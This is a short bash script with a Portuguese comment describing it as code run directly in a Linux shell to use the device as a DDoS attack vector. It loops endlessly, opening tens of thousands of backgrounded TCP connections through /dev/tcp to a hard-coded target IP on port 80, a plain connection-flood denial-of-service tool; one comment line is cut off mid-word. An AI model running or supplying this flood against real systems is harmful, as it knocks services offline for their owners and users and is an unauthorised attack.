#código utilizado diretamente no shell do linux para utilizar aquele dispositivo como um vetor de ataque DDoS

#!/bin/bash

TARGET_IP="192.168.40.32"
TARGET_PORT=80
NUM_CON=50000

while true; do
    for ((i=0;i<NUM_CON;i++)); do
        (echo > /dev/tcp/$TARGET_IP/$TARGET_PORT) &>/dev/null &
        sleep 0.005  # Isso dá um intervalo para chegar a 200 conexões por se$
    done
done
